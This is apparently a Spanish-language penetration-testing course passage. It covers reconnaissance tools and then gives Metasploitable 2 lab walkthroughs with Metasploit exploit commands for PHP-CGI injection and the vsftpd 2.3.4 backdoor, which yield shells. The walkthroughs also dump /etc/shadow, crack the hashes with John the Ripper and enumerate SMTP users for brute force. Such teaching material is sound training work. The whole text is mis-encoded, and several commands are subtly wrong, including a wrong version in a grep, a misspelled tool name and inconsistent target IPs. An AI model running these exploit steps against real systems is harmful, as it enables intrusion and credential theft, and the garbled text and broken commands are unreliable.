La informaci√≥n recopilada durante esta fase proporciona una base s√≥lida para las etapas posteriores de pruebas de penetraci√≥n, permitiendo a los profesionales de seguridad comprender la superficie de ataque y orientar sus esfuerzos de manera efectiva. Es esencial realizar estas actividades dentro de los l√≠mites √©ticos y legales, obteniendo siempre el consentimiento del propietario del sistema o red.

## **Recopilaci√≥n de informaci√≥n sobre aplicaciones web usando Kali Linux y recursos web**

La recopilaci√≥n de inteligencia es la t√©cnica de recopilar informaci√≥n numerosa sobre el objetivo. La recopilaci√≥n de informaci√≥n es el primer paso m√°s importante en la realizaci√≥n de pruebas de penetraci√≥n. La recopilaci√≥n de informaci√≥n le brinda al probador de penetraci√≥n una puerta de entrada para decidir qu√© vulnerabilidades se encuentran com√∫nmente en aplicaciones web espec√≠ficas. Hay muchas herramientas para recopilar informaci√≥n en Kali Linux. En este tutorial, aprenderemos espec√≠ficamente c√≥mo recopilar informaci√≥n de aplicaciones web como Whois, Whatweb, NSLookup y CMSeek. Estas herramientas son de c√≥digo abierto y ya est√°n preinstaladas en Kali Linux. Si no tiene Kali Linux, puede descargar o revisar estos proyectos de herramientas en GitHub.

Los enlaces se proporcionan en cada secci√≥n de herramientas a continuaci√≥n. La recopilaci√≥n de informaci√≥n se puede dividir en dos m√©todos: recopilaci√≥n de informaci√≥n activa y recopilaci√≥n de informaci√≥n pasiva. Al recopilar informaci√≥n de forma activa, el hacker se pone en contacto con el objetivo. Por ejemplo, use una carga √∫til dise√±ada para evaluar c√≥mo responder√≠a una aplicaci√≥n web determinada. Mientras recopila informaci√≥n de forma pasiva, el pirata inform√°tico utiliza un programa de terceros para hacer el trabajo, por ejemplo, utilizando la t√©cnica OSINT para recopilar mucha informaci√≥n disponible en Internet. Dada esta definici√≥n simple, sabr√° de inmediato qu√© herramientas de recopilaci√≥n de informaci√≥n que vamos a utilizar a continuaci√≥n est√°n categorizadas. Conoceremos en detalle los siguientes temas:

- Tipo de informaci√≥n recopilada durante la fase de recopilaci√≥n de informaci√≥n
- Informaci√≥n detallada de propiedad de un nombre de dominio
- Identificar la direcci√≥n IP del servidor de nombres

Antes de que un probador de penetraci√≥n recopile informaci√≥n, primero define el objetivo. Diferentes categor√≠as de objetivos utilizan diferentes t√©cnicas y herramientas apropiadas. Por ejemplo, si su objetivo es una red inal√°mbrica, es posible que no se apliquen las t√©cnicas utilizadas para recopilar informaci√≥n sobre aplicaciones web. Kali Linux es una poderosa distribuci√≥n de Linux que proporciona herramientas de c√≥digo abierto para diversas tareas de recopilaci√≥n de informaci√≥n.

## **WHOIS**

GitHub: [https://github.com/rfc1036/whois](https://github.com/rfc1036/whois) WHOIS es un protocolo de consulta y respuesta transaccional basado en TCP com√∫nmente utilizado para proporcionar informaci√≥n sobre la propiedad de nombres de dominio, p. B. Fecha de registro o fecha de creaci√≥n del dominio y fecha de vencimiento, servidores de nombres e informaci√≥n de contacto del registrante (direcci√≥n, tel√©fono y correo). Algunos proveedores o empresas de registro de dominios pueden ofrecer un servicio para ocultar la informaci√≥n de registro.

Whois viene preinstalado en Kali Linux, tambi√©n se puede encontrar en la web. A menudo uso Whois en Kali Linux y Whois en l√≠nea para ver si hay alguna diferencia en la informaci√≥n entre ellos. En este tutorial definitivamente cubriremos Whois en Kali Linux. Echemos un vistazo al uso del comando Whois en el terminal Kali Linux a continuaci√≥n:

![Whois](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/whois.png?raw=true)

Uso del comando Whois en Kali Linux Para ejecutar Whois en Kali Linux, ingrese el siguiente patr√≥n de comando: Puede agregar ‚Äú‚Äìverbose‚Äù al final del comando para mostrar informaci√≥n m√°s detallada. Recuerda escribir [domain-name] sin tipo de protocolo ni HTTP ni HTTPS. Por ejemplo: El siguiente ejemplo es el resultado de la informaci√≥n del dominio con Whois que est√° disponible p√∫blicamente.

![Whois 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/whois1.png?raw=true)

![Whois 2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/whois2.png?raw=true)


Informaci√≥n del registratario de Whois Como se muestra arriba, hemos podido obtener mucha informaci√≥n detallada sobre la propiedad del nombre de dominio como por ejemplo: Fecha de creaci√≥n, nombre del registrante, direcci√≥n, n√∫mero de tel√©fono y direcci√≥n de correo electr√≥nico. Para guardar la informaci√≥n de la salida del terminal o del archivo de texto, puede agregar un operador de redirecci√≥n de salida (‚Äò>>‚Äô) seguido del nombre y tipo de archivo. El uso de este operador al final de cada comando significa que cualquier resultado que se pretenda mostrar en el terminal tambi√©n se guardar√° en un archivo de texto. Whois dominio >> whois_Dominio.txt Ahora observe c√≥mo el registrante del nombre de dominio usa un servicio privado para mostrar su informaci√≥n whois.

![Usuario Whois](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/usuario-whois.png?raw=true)

Tambi√©n podes obtener informaci√≥n con esta herramienta web: [https://whois.domaintools.com/](https://whois.domaintools.com/)

![Whois Record](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/whois-record.png?raw=true)

![Domain name](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/domain-name.png?raw=true)

## **Nslookup**

NSlookup, abreviatura de b√∫squeda de servidor de nombres, es una herramienta de administraci√≥n de red para consultar detalles del sistema de nombres de dominio de Internet, como registro de direcci√≥n IP, registro MX (servidor de correo), servidor de nombres, registro SOA (inicio de autoridad) y registro TXT. NSLookup es un programa est√°ndar para todos los sistemas operativos. NSLookup tambi√©n viene con una versi√≥n en l√≠nea. Hay tantos sitios web que ofrecen un programa NSLookup.

> Descubre el registro "A" (direcci√≥n IP) del dominio

> **# nslookup**

![nslookup](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup.png?raw=true)

**# nslookup google.com**

![nslookup-google](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup-google.png?raw=true)

![nslookup servidor](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup-servidor.png?raw=true)

**2. Descubre la b√∫squeda de dominio inversa**

**# nslookup 142.250.79.142**

![nslookup usuario](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup-usuario.png?raw=true)

![nslookup users](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup-users.png?raw=true)

## **ViewDNS**

Las herramientas proporcionadas por ViewDNS.info permiten a los usuarios recopilar una gran cantidad de datos sobre un sitio web o direcci√≥n IP determinados. El valor de estos datos a veces puede subestimarse cuando se analizan en su forma cruda, pero cuando se colocan en contexto pueden ser bastante poderosos. Esta secci√≥n tiene como objetivo demostrar parte de la informaci√≥n que se puede descubrir utilizando las herramientas disponibles en este sitio.

[https://viewdns.info/](https://viewdns.info/)

![viewdns](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/viewdns.png?raw=true)

## **DNSdumpster**

DNSdumpster.com es una herramienta GRATUITA de investigaci√≥n de dominios que puede descubrir hosts relacionados con un dominio. Encontrar hosts visibles desde la perspectiva de los atacantes es una parte importante del proceso de evaluaci√≥n de la seguridad.

[https://dnsdumpster.com/](https://dnsdumpster.com/)

![dnsdumpster](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/dnsdumpster.png?raw=true)

### **Mapa del sitio**

![mapa](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/mapa.png?raw=true)

## **B√∫squeda de sub dominios**

Las herramientas de b√∫squeda de subdominios permiten descubrir los subdominios de cualquier dominio objetivo para descubrir posibles puntos de entrada de ataques. Encuentre los sistemas menos protegidos y, por tanto, m√°s vulnerables a los ataques.

[https://subdomains.whoisxmlapi.com/](https://subdomains.whoisxmlapi.com/)

![subdomains](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/subdomains.png?raw=true)


## **Shodan**

Shodan es el primer motor de b√∫squeda del mundo para dispositivos conectados a Internet. Descubra c√≥mo la inteligencia de Internet puede ayudarle a tomar mejores decisiones.

[https://www.shodan.io/](https://www.shodan.io/domain/achirou.com)

![shodan](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/shodan.png?raw=true)

[https://www.shodan.io/host/191.96.144.129](https://www.shodan.io/host/191.96.144.129)

![shodan 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/shodan1.png?raw=true)

## **BuiltWith**

[https://builtwith.com/](https://builtwith.com/detailed/achirou.com)

BuiltWith es una herramienta de creaci√≥n de perfiles de sitios web, generaci√≥n de leads, an√°lisis competitivo e inteligencia empresarial que proporciona adopci√≥n de tecnolog√≠a, datos de comercio electr√≥nico y an√°lisis de uso de Internet.

El seguimiento de tecnolog√≠a de BuiltWith incluye widgets, an√°lisis, marcos, sistemas de gesti√≥n de contenido, anunciantes, redes de entrega de contenido, est√°ndares web y servidores web, por nombrar algunas de las categor√≠as de tecnolog√≠a que cubrimos.

![BuiltWith](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/builtwith.png?raw=true)

## **Prueba del servidor SSL**

Este servicio online gratuito realiza un an√°lisis profundo de la configuraci√≥n de cualquier servidor web SSL en Internet

[https://www.ssllabs.com/](https://www.ssllabs.com/ssltest/analyze.html?d=achirou)

![ssllabs](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ssllabs.png?raw=true)

# 4. Detecci√≥n y explotaci√≥n de vulnerabilidades:

# **Identificaci√≥n y explotaci√≥n de vulnerabilidades conocidas.**

La identificaci√≥n y explotaci√≥n de vulnerabilidades conocidas es una fase cr√≠tica en las pruebas de penetraci√≥n, y se lleva a cabo despu√©s de recopilar informaci√≥n sobre el objetivo y de identificar posibles debilidades en los sistemas y servicios. Aqu√≠ se describen pasos generales y algunas t√©cnicas comunes utilizadas en esta fase:

- **Base de Datos de Vulnerabilidades:** Utilizar bases de datos de vulnerabilidades, como el NIST National Vulnerability Database (NVD) o el Common Vulnerabilities and Exposures (CVE), para identificar vulnerabilidades conocidas.
- **Escaneo de Vulnerabilidades:** Utilizar herramientas automatizadas como Nessus, OpenVAS, o Nexpose para realizar escaneos de vulnerabilidades en los sistemas y servicios objetivo.
- **An√°lisis de Resultados:** Revisar los informes generados por las herramientas de escaneo de vulnerabilidades para identificar las debilidades detectadas y evaluar su criticidad.
- **Priorizaci√≥n de Vulnerabilidades:** Clasificar las vulnerabilidades identificadas seg√∫n su gravedad y su impacto potencial en la seguridad del sistema.
- **Validaci√≥n Manual:** Validar manualmente las vulnerabilidades identificadas para confirmar su existencia y evaluar la posibilidad de explotaci√≥n.
- **Explotaci√≥n Controlada:** En caso de contar con autorizaci√≥n expl√≠cita, realizar pruebas de explotaci√≥n controlada para verificar la efectividad de las vulnerabilidades identificadas.
- **Documentaci√≥n de Hallazgos:** Documentar de manera detallada todas las vulnerabilidades identificadas, incluyendo informaci√≥n sobre su naturaleza, impacto y recomendaciones para la mitigaci√≥n.

Es importante llevar a cabo estas actividades dentro del alcance √©tico y legal de la prueba, obteniendo siempre el consentimiento del propietario del sistema o red. Adem√°s, la comunicaci√≥n transparente de los hallazgos es crucial para facilitar la mitigaci√≥n y mejorar la seguridad del entorno evaluado.

## **Tipos de explotaci√≥n de vulnerabilidades**

Existen muchos tipos de explotaci√≥n de vulnerabilidades:

> **1. Vulnerabilidades de aplicaci√≥n**: Estas vulnerabilidades est√°n relacionadas con los errores de programaci√≥n en la aplicaci√≥n. Esto puede permitir que un atacante explote el c√≥digo vulnerable para comprometer la seguridad de la misma. Estas vulnerabilidades generalmente se encuentran en el lado del cliente, como sitios web, aplicaciones m√≥viles, aplicaciones de escritorio y aplicaciones de servidor.
> 
> **2. Vulnerabilidades de red:** Estas vulnerabilidades se encuentran en el nivel de red debido a la mala configuraci√≥n de los firewalls, protocolos y servicios en la infraestructura. Esto puede permitir que un atacante explote la red para obtener acceso no autorizado.
> 
> **3. Vulnerabilidades de servidor:** Estas vulnerabilidades se encuentran en los servidores y est√°n relacionadas con la mala configuraci√≥n de los servidores. Esto puede permitir que un atacante explote el servidor para obtener acceso no autorizado.
> 
> **4. Vulnerabilidades de software:** Estas vulnerabilidades se encuentran en el software instalado en el sistema. Esto puede permitir que un atacante explote las vulnerabilidades del mismo para obtener acceso no autorizado.
> 
> **5. Vulnerabilidades de hardware:** Estas vulnerabilidades se encuentran en el hardware de la computadora. Esto puede permitir que un atacante explote el hardware para obtener acceso no autorizado.
> 

## **Recomendaciones importantes**

Es importante entender c√≥mo combatir estos tipos de explotaci√≥n de vulnerabilidades. Aqu√≠ te dejamos algunas recomendaciones:

> ‚Ä¢ Implementar controles de seguridad efectivos, como firewalls, antivirus, antispam y herramientas de filtrado de contenido.
> 
> - Monitorear los sistemas de forma continua para detectar y responder a los intentos de explotaci√≥n de vulnerabilidades.
> - Asegurarse de que todos los sistemas est√©n actualizados y las vulnerabilidades sean mitigadas de forma adecuada.
> - Utilizar una soluci√≥n de seguridad que se centre en la prevenci√≥n, incluso si se detectan intentos de explotaci√≥n.
> - Realizar pruebas de Hacking √âtico o Ethical Hacking peri√≥dicas para detectar vulnerabilidades o fallos de seguridad.
> - Utilizar soluciones de seguridad basadas en la nube para mejorar la seguridad y la gesti√≥n de los sistemas.
> - Proporcionar educaci√≥n y capacitaci√≥n a los usuarios finales para reducir los riesgos de explotaci√≥n de vulnerabilidades.

La mejor manera de protegerse de la explotaci√≥n de vulnerabilidades es mediante la implementaci√≥n de buenas pr√°cticas de seguridad y la adopci√≥n de soluciones de seguridad eficaces. Por lo tanto, es importante tomar medidas c√≥mo las anteriores para protegerse de un ciberataque.

# **Uso de exploits y herramientas automatizadas.**

El uso de exploits y herramientas automatizadas es una parte esencial de las pruebas de penetraci√≥n, pero debe llevarse a cabo con responsabilidad y √©tica. Aqu√≠ se describen las consideraciones y pasos generales para el uso de exploits y herramientas automatizadas en el contexto de una evaluaci√≥n de seguridad:

- **Consentimiento del Propietario:** Obtener el consentimiento expl√≠cito del propietario del sistema o red antes de utilizar exploits o realizar pruebas de penetraci√≥n.
- **Entendimiento del Alcance:** Clarificar y entender claramente el alcance de la prueba, incluyendo los sistemas y servicios espec√≠ficos que est√°n autorizados para ser evaluados.
- **Documentaci√≥n Detallada:** Documentar de manera detallada cada acci√≥n realizada, incluyendo el uso de exploits y herramientas automatizadas, junto con sus resultados.
- **Mitigaci√≥n de Riesgos:** Evaluar y mitigar cualquier riesgo potencial asociado con el uso de exploits, asegur√°ndose de no causar da√±o irreparable.
- **Priorizaci√≥n de Vulnerabilidades:** Priorizar el uso de exploits en funci√≥n de la gravedad y el impacto potencial de las vulnerabilidades identificadas.

## **Paso a paso**

- **Identificaci√≥n de Vulnerabilidades:** Utilizar herramientas de escaneo y an√°lisis para identificar vulnerabilidades en sistemas y servicios.
- **Selecci√≥n de Exploits:** Seleccionar exploits espec√≠ficos que sean relevantes para las vulnerabilidades identificadas.
- **Pruebas Controladas:** Realizar pruebas de penetraci√≥n controladas utilizando exploits, asegur√°ndose de no causar da√±o no autorizado.
- **Validaci√≥n Manual:** Validar manualmente la existencia de las vulnerabilidades y la efectividad de los exploits utilizados.
- **Documentaci√≥n de Resultados:** Documentar los resultados de las pruebas, incluyendo detalles sobre la explotaci√≥n exitosa o cualquier problema encontrado.
- **Comunicaci√≥n Transparente:** Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas, los resultados obtenidos y las recomendaciones de mitigaci√≥n.

## **Herramientas Comunes para Uso de Exploits y Automatizaci√≥n:**

**Metasploit:** Marco de desarrollo de pruebas de penetraci√≥n con una amplia variedad de m√≥dulos de exploits.

> Uso: Pruebas controladas de explotaci√≥n para validar vulnerabilidades.

**ExploitDB:** Base de datos de exploits y t√©cnicas de penetraci√≥n.

> Uso: B√∫squeda y selecci√≥n de exploits espec√≠ficos.

**AutoSploit:** Herramienta de automatizaci√≥n que selecciona exploits de manera autom√°tica.

> Uso: Pruebas automatizadas de vulnerabilidades.

**Armitage:** Interfaz gr√°fica para Metasploit con funciones de automatizaci√≥n.

> Uso: Facilita la gesti√≥n y ejecuci√≥n de exploits.

# **Pruebas de penetraci√≥n en servicios comunes (por ejemplo, HTTP, FTP).**

Las pruebas de penetraci√≥n en servicios como HTTP, FTP, SSH, TELNET son esenciales para evaluar la seguridad de un sistema. A continuaci√≥n, se describen algunos pasos generales y t√©cnicas comunes utilizadas en este tipo de pruebas utilizaremos Metasploit y Metasploitable:

## **HTTP (Servidor Web):**

- **Escaneo de Puertos:** Utilizar herramientas como Nmap para identificar servicios activos, incluyendo HTTP en el puerto 80 y HTTPS en el puerto 443.
- **An√°lisis de Tecnolog√≠as Web:** Utilizar herramientas como Wappalyzer o BuiltWith para identificar las tecnolog√≠as y plataformas web utilizadas en el servidor.
- **Enumeraci√≥n de Directorios y Archivos:** Utilizar herramientas como dirb, dirbuster o gobuster para enumerar directorios y archivos en el servidor web.
- **Escaneo de Vulnerabilidades Web:** Utilizar herramientas como Nikto o OWASP ZAP para realizar escaneos de vulnerabilidades en la aplicaci√≥n web.
- **Explotaci√≥n de Vulnerabilidades Conocidas:** Si se encuentran vulnerabilidades conocidas, utilizar exploits apropiados para verificar la explotaci√≥n controlada.
- **Inyecci√≥n de SQL y XSS:** Probar la seguridad contra inyecciones SQL y ataques de scripting entre sitios (XSS) utilizando herramientas como SQLMap o Burp Suite.

El puerto 80 es el puerto predeterminado para los servicios http (p√°ginas web). En un an√°lisis anterior determinamos que el puerto 80 est√° abierto. Ahora es el momento de determinar qu√© se ejecuta detr√°s de ese puerto.

Buscamos cual es la IP. En este caso es 192.168.1.49.

![IP caso](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ipcaso.png?raw=true)

Primero haz un escaneo de nmap:

> Db_nmap -sV 192.168.1.49 -p 80

![Db_nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/db_nmap.png?raw=true)

Es Apache ejecut√°ndose en Ubuntu. Intentemos recopilar m√°s informaci√≥n con un esc√°ner auxiliar:

> use auxiliary/scanner/http/http_version
> 
> 
> *> show options*
> 

![Db_nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/db_nmap.png?raw=true)

> *set RHOST 192.168.1.49*
> 
> 
> *> run*
> 

![RHOST](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/RHOST.png?raw=true)

Es Apache 2.2.8 con PHP 5.2.4. Podemos navegar hasta ' [http://192.168.231.109/phpinfo.php](http://metasploitable/phpinfo.php) ' y confirmar la informaci√≥n ya recopilada:

![Apache](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/apache.png?raw=true)

Probemos otros m√≥dulos http para obtener m√°s informaci√≥n sobre nuestro servidor:

'dir_listing' determinar√° si el listado de directorios est√° habilitado:

*> use auxiliary/scanner/http/dir_listing*

*> show options*

![Show options](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/show-options.png?raw=true)

*set RHOST 192.168.1.49*

*> run*

![Run](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run.png?raw=true)

Sin suerte. 'dir_scanner' buscar√° directorios interesantes:

*> use auxiliary/scanner/http/dir_scanner*

*> show options*

*set RHOST 192.168.1.49*

*> run*

![Run Set](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-set.png?raw=true)

Tenemos 6 directorios. Revisar su contenido podr√≠a darnos una ventaja para hackear nuestro objetivo. Probemos con otro m√≥dulo, 'files_dir':

*> use auxiliary/scanner/http/files_dir*

*> show options*

*set RHOST 192.168.1.49*

*> run*

![Run RHOST](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-rhost.png?raw=true)

Una vez m√°s, estos resultados podr√≠an marcar la diferencia y deber√≠amos echarles un vistazo. Otro m√≥dulo de inter√©s id 'options', 'robots_txt' y 'verb_auth_bypass':

*> use auxiliary/scanner/http/verb_auth_bypass*

*> show options*

*set RHOST 192.168.1.49*

*> run*

![Run proxies](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-proxies.png?raw=true)

> Y muchos m√≥dulos m√°s que te invito a probar.
> 
> 
> Hagamos uso de la informaci√≥n que recopilamos.
> 
> Busquemos en exploitDB Apache con la versi√≥n de PHP:
> 
> *$ searchsploit apache | grep 5.4.2*
> 

![Apache1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/apache1.png?raw=true)
Se encontr√≥ ejecuci√≥n remota de c√≥digo CGI. Explot√©moslo:

*> use exploit/multi/http/php_cgi_arg_injection*

*set RHOST 192.168.1.49*

*>run*

![Run Exploit](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-exploit.png?raw=true)

¬°¬°Tenemos un shell meterpreter!! ¬°¬°¬°Happy hacking!!!

El puerto 80 es una buena fuente de informaci√≥n y aprovecha como cualquier otro puerto. Volveremos a este puerto para las aplicaciones web instaladas. En este art√≠culo obtuvimos informaci√≥n sobre los servicios en ejecuci√≥n y encontramos un exploit que nos proporcion√≥ un shell.

## **FTP (Protocolo de Transferencia de Archivos):**

- **Escaneo de Puertos:** Utilizar herramientas como Nmap para identificar servicios activos, incluyendo FTP en el puerto 21.
- **Enumeraci√≥n de Usuarios An√≥nimos:** Verificar si el servidor FTP permite conexiones an√≥nimas y si ofrece acceso a informaci√≥n sensible.
- **Intentos de Acceso No Autorizado:** Intentar acceder al servidor FTP con credenciales d√©biles o por defecto para evaluar la seguridad de autenticaci√≥n.
- **Escaneo de Directorios:** Utilizar herramientas como Nmap o dirb para escanear directorios en el servidor FTP.
- **Transferencia de Archivos:** Subir y descargar archivos para evaluar la integridad del control de acceso y la seguridad del sistema.
- **Explotaci√≥n de Vulnerabilidades Conocidas:** Si se encuentran vulnerabilidades conocidas en el servidor FTP, utilizar exploits apropiados para verificar la explotaci√≥n controlada.

## **Escaneo y ataque del puerto 21 con Metasploitable 2**

Comprobemos el estado de la base de datos, creemos nuestro espacio de trabajo y configuremos nuestros RHOSTS globales, para no ingresarlos en cada intento:

![Escaneo y Ataque](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/escaneo-ataque.png?raw=true)

Comenzaremos con el puerto 21, el puerto predeterminado de ftp.

Dentro del marco de metasploit, ejecutaremos un an√°lisis del servicio nmap dirigido al puerto 21:

> > db_nmap -p 21 192.168.231.109 -A -sV -sC
> 

MSF tambi√©n dispone de un m√≥dulo auxiliar para ftp:

> > use auxiliary/scanner/ftp/ftp_version
> 
> 
> *> run*
> 

![auxiliary](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/auxiliary.png?raw=true)

*Veamos los resultados de nuestro escaneo de puertos:*

# Untitled

*Veamos los resultados de nuestro escaneo de puertos:*

![resultado Puertos](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/resultado-puertos.png?raw=true)

*Disponemos de un Servidor FTP, concretamente vsFTP 2.3.4. correr. Hagamos una b√∫squeda en exploitDB a trav√©s de searchploit:*

> $ searchsploit vsftp

![searchsploit](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/searchsploit.png?raw=true)

*Como podemos ver, existe un exploit de ejecuci√≥n de comandos de puerta trasera para nuestra versi√≥n de vsftp. Volvamos a MSF, busquemos el exploit, carguemoslo, veamos su informaci√≥n y ejec√∫telo:*

> grep vsftp search exploits

![grep vsftp](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/grep-vsftp.png?raw=true)

> use exploit/unix/ftp/vsftp_234_backdoor

> *show info*

![show info](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/show-info.png?raw=true)

> run

![run3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run3.png?raw=true)

*Y ahora tenemos un shell en la sesi√≥n 2. Podemos enviarlo al fondo (^Z), enumerar las sesiones abiertas (sesiones -l) e interactuar (sesiones 2)*

![Sesiones](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sesiones.png?raw=true)

*Intentaremos extraer usuarios y contrase√±as del objetivo utilizando el m√≥dulo hashdump. Ponga la sesi√≥n en segundo plano y seleccione el m√≥dulo:*

![Hashdump](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/hashdump.png?raw=true)

> use post/linux/gather/hashdump

> *show options*

> *set SESSION 2*

> *show info*

> *run*

*Ahora usa el comando 'loot' para ver los resultados hasta el momento:*

> loot

![loot](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/loot.png?raw=true)

*Pudimos obtener los archivos passwd, shadow y unshadow.*

*Abra otra terminal para que John el Destripador los abra:*

> $ john .msf4/loot/20190402110303_metasploitable2_192.168.231.109_linux.hashes_935091.txt

*Para ver los resultados utilice la opci√≥n --show:*

![show](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/show.png?raw=true)

*Escaneamos el puerto 21 y determinamos que una versi√≥n vulnerable estaba ejecutando el servicio FTP. Usando MSF pudimos:*

- *crear una sesi√≥n remota,*
- *obtener los archivos /etc/passwd y /etc/shadow*
- *obtener credenciales de acceso usando John the Ripper*

## ***Puerto 25 SMTP (Simple Mail Transfer Protocol)***

*Las pruebas de penetraci√≥n en SMTP (Simple Mail Transfer Protocol) son esenciales para evaluar la seguridad de los servidores de correo electr√≥nico. A continuaci√≥n, se describen las fases clave de las pruebas de penetraci√≥n en SMTP:*

- *Reconocimiento:*
    - *Identificaci√≥n del servidor SMTP: Determina las direcciones IP y los nombres de dominio asociados con el servidor de correo electr√≥nico objetivo.*
    - *Enumeraci√≥n de usuarios: Recopila informaci√≥n sobre usuarios v√°lidos, lo que podr√≠a facilitar ataques de fuerza bruta o de diccionario.*
- *An√°lisis de Configuraci√≥n:*
    - *Verificaci√≥n de restricciones de acceso: Eval√∫a las pol√≠ticas de acceso, como las restricciones basadas en direcciones IP.*
    - *Validaci√≥n de filtrado de contenido: Asegura que el servidor filtre contenido malicioso y maneje adecuadamente los archivos adjuntos.*
- *Ataques de Fuerza Bruta: Realiza intentos de inicio de sesi√≥n con contrase√±as comunes o d√©biles para evaluar la resistencia del sistema.*
- *Verificaci√≥n de Autenticaci√≥n: Autenticaci√≥n segura: Confirma que las pol√≠ticas de autenticaci√≥n, como STARTTLS, se implementan de manera segura.*
- *Pruebas de Relay Abierto: Comprueba si el servidor permite el reenv√≠o de correos electr√≥nicos sin autenticaci√≥n, lo cual puede ser explotado por atacantes.*
- *Ataques de Inyecci√≥n de Correo Electr√≥nico: Eval√∫a la capacidad del servidor para resistir ataques de manipulaci√≥n de encabezados de correo electr√≥nico.*
- *Inyecci√≥n de contenido: Verifica la resistencia a la inyecci√≥n de contenido malicioso en el cuerpo del correo electr√≥nico.*
- *Exploraci√≥n de Vulnerabilidades: Identifica posibles servicios relacionados con el correo electr√≥nico que podr√≠an tener vulnerabilidades.*
- *Pruebas contra servidores web asociados: Eval√∫a la seguridad de aplicaciones web relacionadas con el correo electr√≥nico.*
- *An√°lisis de Reglas Antispam: Intenta enviar correos electr√≥nicos maliciosos sin ser detectado por los filtros antispam.*
- *Retenci√≥n y eliminaci√≥n de mensajes: Verifica si el servidor sigue las pol√≠ticas de retenci√≥n y eliminaci√≥n de mensajes.*
- *Documentaci√≥n detallada: Proporciona informes detallados de las vulnerabilidades encontradas, junto con recomendaciones para su mitigaci√≥n.*
- *Las pruebas de penetraci√≥n en SMTP son fundamentales para garantizar la integridad y la seguridad de las comunicaciones por correo electr√≥nico en una organizaci√≥n.*

## ***Escaneo y ataque del puerto 25 con Metasploitable 2***

*Nuestra primera tarea es determinar qu√© software y versi√≥n se ejecuta detr√°s del puerto 25. Usemos nmap:*

> db_nmap -p 25 -sC -sV -A 192.168.231.109

![db_nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/db_nmap.png?raw=true)

> use auxiliary/scanner/smtp/smtp_version

*Despu√©s de ejecutar el m√≥dulo, aqu√≠ est√°n los resultados:*

![smtp_version](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/smtp_version.png?raw=true)

*Como hicimos en la parte II, busquemos en exploitDB, google, etc.*

*MSF tiene un m√≥dulo de enumeraci√≥n de usuarios para SMTP.*

> use auxiliar/scanner/smtp/smtp_enum
> *run*

![SMTP](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/smtp.png?raw=true)

*El m√≥dulo pudo extraer una lista de usuarios. Ahora podemos intentar entrar por la fuerza bruta con estos usuarios.*

## ***Comandos SMTP 25***

*SMTP significa Protocolo simple de transporte de correo y es un protocolo de servidor a servidor y mantiene una base de datos local de usuarios a los que debe enviar y recibir correos electr√≥nicos.*

*SMTP tiene un conjunto de comandos ( [v√©alos aqu√≠](http://www.tcpipguide.com/free/t_SMTPCommands-2.htm) ). Nos conectaremos a nuestro objetivo a trav√©s del puerto 25 e intentaremos adquirir los correos electr√≥nicos de esta base de datos. Abra una nueva terminal y escriba:*

> $nc 192.168.231.109 25

*Ya estamos dentro. Usemos el comando 'VRFY' para enumerar los usuarios:*

> *VRFY user*

![VRFY](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/vrfy.png?raw=true)

*En lugar de hacer esto a mano, usemos una herramienta de nuestro cintur√≥n de herramientas: smtp-user-enum.*

![smtp-user-enum](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/smtp-user-enum.png?raw=true)

*Ejecutando la opci√≥n '-h' podemos ver el uso. Usaremos una lista de palabras de Kali:*

> $ smpt-users-enum -M VRFY -U /usr/share/wordlist/fern-wifi -t 192.168.231.109

